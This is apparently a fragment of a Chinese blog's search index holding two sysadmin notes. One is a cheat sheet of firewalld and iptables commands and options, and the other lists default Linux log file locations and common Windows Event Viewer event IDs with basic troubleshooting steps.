<td style="text-align:left">service firewalld restart</td>
</tr>
<tr>
<td style="text-align:center">查看firewall的状态</td>
<td style="text-align:left">firewall-cmd - -state</td>
</tr>
<tr>
<td style="text-align:center">查看防火墙已有规则列表</td>
<td style="text-align:left">firewall-cmd - -list-all</td>
</tr>
<tr>
<td style="text-align:center">查看firewall服务状态</td>
<td style="text-align:left">systemctl status firewalld</td>
</tr>
</tbody>
</table>
<p>原文链接：<a href="https://blog.csdn.net/ababab12345/article/details/121989807">https://blog.csdn.net/ababab12345/article/details/121989807</a></p>
<h3 id="开放端口">开放端口</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=80/tcp</span><br></pre></td></tr></table></figure>
<h3 id="禁用端口">禁用端口</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --remove-port=80/tcp</span><br></pre></td></tr></table></figure>
<h3 id="刷新规则">刷新规则</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h3 id="查询端口是否开放">查询端口是否开放</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --query-port=80w/tcp</span><br></pre></td></tr></table></figure>
<h3 id="查看已开放的端口">查看已开放的端口</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>
<h2 id="iptables">iptables</h2>
<h3 id="防火墙命令参数">防火墙命令参数</h3>
<table>
<thead>
<tr>
<th style="text-align:right">选 项</th>
<th style="text-align:left">功 能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">-A</td>
<td style="text-align:left">添加防火墙规则</td>
</tr>
<tr>
<td style="text-align:right">-D</td>
<td style="text-align:left">删除防火墙规则</td>
</tr>
<tr>
<td style="text-align:right">-I</td>
<td style="text-align:left">插入防火墙规则</td>
</tr>
<tr>
<td style="text-align:right">-F</td>
<td style="text-align:left">清空防火墙规则</td>
</tr>
<tr>
<td style="text-align:right">-L</td>
<td style="text-align:left">列出添加防火墙规则</td>
</tr>
<tr>
<td style="text-align:right">-R</td>
<td style="text-align:left">替换防火墙规则</td>
</tr>
<tr>
<td style="text-align:right">-Z</td>
<td style="text-align:left">清空防火墙数据表统计信息</td>
</tr>
<tr>
<td style="text-align:right">-P</td>
<td style="text-align:left">设置链默认规则</td>
</tr>
</tbody>
</table>
<h3 id="防火墙规则增删改参数">防火墙规则增删改参数</h3>
<table>
<thead>
<tr>
<th style="text-align:center">参 数</th>
<th style="text-align:left">功 能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">[!]-p</td>
<td style="text-align:left">匹配协议（不加协议则是all），! 表示取反</td>
</tr>
<tr>
<td style="text-align:center">[!]-s</td>
<td style="text-align:left">匹配源地址</td>
</tr>
<tr>
<td style="text-align:center">[!]-d</td>
<td style="text-align:left">匹配目标地址</td>
</tr>
<tr>
<td style="text-align:center">[!]-i</td>
<td style="text-align:left">匹配入站网卡接口</td>
</tr>
<tr>
<td style="text-align:center">[!]-o</td>
<td style="text-align:left">匹配出站网卡接口</td>
</tr>
<tr>
<td style="text-align:center">[!]–sport</td>
<td style="text-align:left">匹配源端口</td>
</tr>
<tr>
<td style="text-align:center">[!]–dport</td>
<td style="text-align:left">匹配目标端口</td>
</tr>
<tr>
<td style="text-align:center">[!]–src-range</td>
<td style="text-align:left">匹配源地址范围</td>
</tr>
<tr>
<td style="text-align:center">[!]–dst-range</td>
<td style="text-align:left">匹配目标地址范围</td>
</tr>
<tr>
<td style="text-align:center">[!]–limit</td>
<td style="text-align:left">四配数据表速率</td>
</tr>
<tr>
<td style="text-align:center">[!]–mac-source</td>
<td style="text-align:left">匹配源MAC地址</td>
</tr>
<tr>
<td style="text-align:center">[!]–sports</td>
<td style="text-align:left">匹配源端口</td>
</tr>
<tr>
<td style="text-align:center">[!]–dports</td>
<td style="text-align:left">匹配目标端口</td>
</tr>
<tr>
<td style="text-align:center">[!]–stste</td>
<td style="text-align:left">匹配状态（INVALID、ESTABLISHED、NEW、RELATED)</td>
</tr>
<tr>
<td style="text-align:center">[!]–string</td>
<td style="text-align:left">匹配应用层字串</td>
</tr>
</tbody>
</table>
<h3 id="防火墙信息详细意义">防火墙信息详细意义</h3>
<table>
<thead>
<tr>
<th style="text-align:center">触发动作</th>
<th style="text-align:left">功 能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ACCEPT</td>
<td style="text-align:left">允许数据包通过</td>
</tr>
<tr>
<td style="text-align:center">DROP</td>
<td style="text-align:left">丢弃数据包</td>
</tr>
<tr>
<td style="text-align:center">REJECT</td>
<td style="text-align:left">拒绝数据包通过</td>
</tr>
<tr>
<td style="text-align:center">LOG</td>
<td style="text-align:left">将数据包信息记录 syslog 曰志</td>
</tr>
<tr>
<td style="text-align:center">DNAT</td>
<td style="text-align:left">目标地址转换</td>
</tr>
<tr>
<td style="text-align:center">SNAT</td>
<td style="text-align:left">源地址转换</td>
</tr>
<tr>
<td style="text-align:center">MASQUERADE</td>
<td style="text-align:left">地址欺骗</td>
</tr>
<tr>
<td style="text-align:center">REDIRECT</td>
<td style="text-align:left">重定向</td>
</tr>
</tbody>
</table>
<p>原文链接：<a href="https://blog.csdn.net/daocaokafei/article/details/115091313">https://blog.csdn.net/daocaokafei/article/details/115091313</a></p>
<h3 id="命令使用实例">命令使用实例</h3>
<p>查看防火墙规则</p>
<pre><code>iptables -L （可加INPUT或者OUTPUT等参数）
</code></pre>
<p>开放端口</p>
<pre><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT
</code></pre>
<p>增加规则</p>
<pre><code>iptables -A INPUT -s 192.168.1.5 -j DROP
</code></pre>
<p>改规则</p>
<pre><code>iptables -R INPUT 6 -s 194.168.1.5 -j ACCEPT
</code></pre>
<p>删规则</p>
<pre><code>iptables -D INPUT 6
</code></pre>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>默认日志目录</title>
    <url>/2025/06/22/%E9%BB%98%E8%AE%A4%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<h2 id="linux">linux</h2>
<h3 id="系统日志">系统日志</h3>
<table>
<thead>
<tr>
<th><strong>日志类别</strong></th>
<th><strong>日志文件/目录</strong></th>
<th><strong>说明</strong></th>
<th><strong>典型发行版</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>系统日志</strong></td>
<td><code>/var/log/syslog</code></td>
<td>系统事件和服务日志（多信息汇总）</td>
<td>Debian/Ubuntu</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/messages</code></td>
<td>系统和内核信息日志</td>
<td>RHEL/CentOS/Fedora</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/dmesg</code></td>
<td>内核环缓冲区日志，启动硬件信息</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/kern.log</code></td>
<td>内核日志</td>
<td>Debian/Ubuntu</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/boot.log</code></td>
<td>启动过程日志</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/cron</code></td>
<td>定时任务日志</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/lastlog</code></td>
<td>所有用户的最后登录时间</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/wtmp</code></td>
<td>登录/注销记录，<code>last</code> 命令查看</td>
<td>通用</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/btmp</code></td>
<td>失败的登录尝试记录，<code>lastb</code> 查看</td>
<td>通用</td>
</tr>
<tr>
<td><strong>安全认证日志</strong></td>
<td><code>/var/log/auth.log</code></td>
<td>认证、登录、sudo操作日志</td>
<td>Debian/Ubuntu</td>
</tr>
<tr>
<td></td>
<td><code>/var/log/secure</code></td>
<td>认证、登录、sudo操作日志</td>
<td>RHEL/CentOS/Fedora</td>
</tr>
<tr>
<td><strong>审计日志</strong></td>
<td><code>/var/log/audit/audit.log</code></td>
<td>auditd 审计日志，系统调用、安全事件</td>
<td>需要安装 auditd</td>
</tr>
<tr>
<td><strong>系统服务</strong></td>
<td><code>journalctl</code>（无固定日志文件，使用系统日志管理）</td>
<td>系统服务日志</td>
<td>通用</td>
</tr>
</tbody>
</table>
<h3 id="Linux-常见的应用程序日志目录和文件">Linux 常见的应用程序日志目录和文件</h3>
<table>
<thead>
<tr>
<th><strong>应用类型</strong></th>
<th><strong>应用名称</strong></th>
<th><strong>日志文件或目录</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Web服务器</strong></td>
<td>Apache HTTP Server</td>
<td><code>/var/log/apache2/</code>（Ubuntu/Debian）<br><code>/var/log/httpd/</code>（CentOS/RHEL）</td>
<td>访问日志 <code>access.log</code>，错误日志 <code>error.log</code></td>
</tr>
<tr>
<td></td>
<td>Nginx</td>
<td><code>/var/log/nginx/</code></td>
<td>访问日志 <code>access.log</code>，错误日志 <code>error.log</code></td>
</tr>
<tr>
<td><strong>数据库</strong></td>
<td>MySQL / MariaDB</td>
<td><code>/var/log/mysql/</code><br><code>/var/log/mariadb/</code></td>
<td>查询日志、错误日志等</td>
</tr>
<tr>
<td><strong>邮件服务器</strong></td>
<td>Postfix</td>
<td><code>/var/log/mail.log</code> 或 <code>/var/log/maillog</code></td>
<td>邮件发送接收日志</td>
</tr>
<tr>
<td></td>
<td>Exim</td>
<td><code>/var/log/exim4/</code>（Debian系）</td>
<td>邮件日志</td>
</tr>
<tr>
<td></td>
<td>Dovecot</td>
<td><code>/var/log/dovecot.log</code></td>
<td>邮件服务器日志</td>
</tr>
<tr>
<td><strong>FTP服务器</strong></td>
<td>vsftpd</td>
<td><code>/var/log/vsftpd.log</code> 或 <code>/var/log/xferlog</code></td>
<td>传输日志</td>
</tr>
<tr>
<td></td>
<td>proftpd</td>
<td><code>/var/log/proftpd/</code></td>
<td>传输和错误日志</td>
</tr>
<tr>
<td><strong>容器管理</strong></td>
<td>Docker</td>
<td><code>/var/log/docker.log</code>（或由 systemd 管理）</td>
<td>容器运行日志</td>
</tr>
<tr>
<td><strong>监控工具</strong></td>
<td>Prometheus</td>
<td>自定义目录，通常在 <code>/var/log/prometheus/</code></td>
<td>监控数据及运行日志</td>
</tr>
<tr>
<td><strong>备份工具</strong></td>
<td>rsync</td>
<td>一般无默认日志，需要自行配置</td>
<td>备份传输日志</td>
</tr>
<tr>
<td><strong>代理服务器</strong></td>
<td>Squid Proxy</td>
<td><code>/var/log/squid/</code></td>
<td>访问日志、缓存日志</td>
</tr>
</tbody>
</table>
<h2 id="windows">windows</h2>
<p>按<code>Win + R</code>，输入<code>eventvwr</code></p>
<h3 id="常见日志分类">常见日志分类</h3>
<table>
<thead>
<tr>
<th>日志类型</th>
<th>路径</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Application</strong></td>
<td>事件查看器 → Windows 日志 → Application</td>
<td>应用程序产生的日志，错误和警告等</td>
</tr>
<tr>
<td><strong>System</strong></td>
<td>事件查看器 → Windows 日志 → System</td>
<td>系统和驱动的日志，检测启动、崩溃、硬件错误等</td>
</tr>
<tr>
<td><strong>Security</strong></td>
<td>事件查看器 → Windows 日志 → Security</td>
<td>登陆、登出、提权等安全审计记录</td>
</tr>
<tr>
<td><strong>Setup</strong></td>
<td>事件查看器 → Windows 日志 → Setup</td>
<td>系统安装、更新和配置相关日志</td>
</tr>
<tr>
<td><strong>Forwarded Events</strong></td>
<td>事件查看器 → Windows 日志 → Forwarded Events</td>
<td>聚合其他机器转发来的日志</td>
</tr>
</tbody>
</table>
<h3 id="Windows-事件日志常见错误代码和对应意义">Windows 事件日志常见错误代码和对应意义</h3>
<table>
<thead>
<tr>
<th>事件ID</th>
<th>来源</th>
<th>含义</th>
<th>场景示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>41</td>
<td>Kernel-Power</td>
<td>意外关机或重启</td>
<td>电脑突然断电、崩溃</td>
</tr>
<tr>
<td>1001</td>
<td>BugCheck</td>
<td>蓝屏崩溃记录</td>
<td>检查对应错误代码确定蓝屏原因</td>
</tr>
<tr>
<td>6008</td>
<td>EventLog</td>
<td>非正常关机</td>
<td>重启、掉电后进入Windows</td>
</tr>
<tr>
<td>1000</td>
<td>Application Error</td>
<td>应用程序崩溃</td>
<td>程序异常退出，通常附带崩溃模块和代码</td>
</tr>
<tr>
<td>1014</td>
<td>DNS Client Events</td>
<td>域名解析失败</td>
<td>网络问题、DNS配置错误</td>
</tr>
<tr>
<td>55</td>
<td>Ntfs</td>
<td>文件系统错误</td>
<td>硬盘或分区潜在问题</td>
</tr>
<tr>
<td>10016</td>
<td>DistributedCOM</td>
<td>COM/DCOM 权限错误</td>
<td>某些应用因没有适当授权而出警告</td>
</tr>
<tr>
<td>7031 / 7034</td>
<td>Service Control Manager</td>
<td>服务意外停止</td>
<td>某服务崩溃或被强行停止</td>
</tr>
<tr>
<td>1002</td>
<td>Application Hang</td>
<td>应用无响应</td>
<td>程序卡死、无响应</td>
</tr>
<tr>
<td>4625</td>
<td>Security</td>
<td>登录失败</td>
<td>非法登录尝试</td>
</tr>
<tr>
<td>4672</td>
<td>Security</td>
<td>管理员特权登录</td>
<td>管理员账户登录记录</td>
</tr>
<tr>
<td>4771</td>
<td>Security</td>
<td>Kerberos 预身份验证失败</td>
<td>域登录失败，通常为密码错误</td>
</tr>
<tr>
<td>4740</td>
<td>Security</td>
<td>账户被锁定</td>
<td>用户账户连续登录失败导致锁定</td>
</tr>
</tbody>
</table>
<h3 id="简单排查思路">简单排查思路</h3>
<ol>
<li>检查 System 和 Application 中是否有 Error 或 Warning。</li>
<li>按 Event ID 定位问题，例如：
<ul>
<li>找到 41 → 检查是否为掉电或过载。</li>
<li>找到 1000 / 1001 → 检查是否应用崩溃。</li>
<li>在安全日志检查是否有：
<ul>
<li>大量 4625 → 可疑登录尝试。</li>
<li>大量 4740 → 用户账户锁定。</li>
</ul>
</li>
<li>检查是否有磁盘错误 (55)、服务错误 (7031、7034)。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>系统运维</tag>
        <tag>日志文件</tag>
      </tags>
  </entry>
</search>
